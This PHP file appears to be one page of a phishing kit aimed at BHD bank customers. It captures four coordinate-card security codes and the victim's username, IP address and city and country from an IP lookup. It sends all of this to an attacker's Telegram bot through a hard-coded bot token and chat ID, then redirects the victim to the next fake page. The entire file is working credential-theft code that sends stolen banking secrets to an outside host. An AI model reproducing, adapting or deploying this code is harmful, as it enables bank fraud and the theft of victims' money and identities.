<?php
session_start(); 

// Configuración del bot
$token = "8202173622:AAG7lPsKeZ_o_lTCtcRA7C5ZCM15tkTMMYc"; // Pon tu token
$chat_id = "8029675723"; // Pon tu chat_id

// Recuperar datos de la sesión
$uernm24 = $_SESSION['uernm24'] ?? 'N/A';

// Capturar datos del formulario
$cod1 = $_POST['125'] ?? 'N/A';
$cod2 = $_POST['225'] ?? 'N/A';
$cod3 = $_POST['325'] ?? 'N/A';
$cod4 = $_POST['425'] ?? 'N/A';

// Guardar en sesión si necesitas usar después
$_SESSION['125'] = $cod1;
$_SESSION['225'] = $cod2;
$_SESSION['325'] = $cod3;
$_SESSION['425'] = $cod4;

// Capturar IP real
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
} else {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'IP no disponible';
}

// Geolocalización por IP
$pais = 'N/A';
$ciudad = 'N/A';

$geo_url = "http://ip-api.com/json/$ip";
$geo_response = @file_get_contents($geo_url);
if ($geo_response !== false) {
    $geo_data = json_decode($geo_response, true);
    if ($geo_data && $geo_data['status'] === 'success') {
        $pais = $geo_data['country'] ?? 'N/A';
        $ciudad = $geo_data['city'] ?? 'N/A';
    }
} 

// Fecha y hora
$fecha = date("Y-m-d H:i:s");

// Armar mensaje para Telegram
$mensaje = "*💳 BHD Tarjeta Coordenadas (2):*\n\n"
         . "*✉️ Usuario:* `$uernm24`\n\n"
         . "*04:* `$cod1`\n"
         . "*14:* `$cod2`\n"
         . "*24:* `$cod3`\n"
         . "*34:* `$cod4`\n\n"
         . "*🌐 IP:* `$ip`\n"
         . "*🏙 Ciudad:* `$ciudad`\n"
         . "*🇩🇴 País:* `$pais`\n"
         . "*🕒 Fecha:* `$fecha`\n\n"
         . "👣 @asoctrasmacol";

// Enviar a Telegram
$url = "https://api.telegram.org/bot$token/sendMessage";
$data = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'Markdown'
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
if ($response === false) {
    echo "❌ Error en cURL: " . curl_error($ch);
}
curl_close($ch);

// Redirigir después del envío
header("Location: coordenada3.html");
exit();
?>
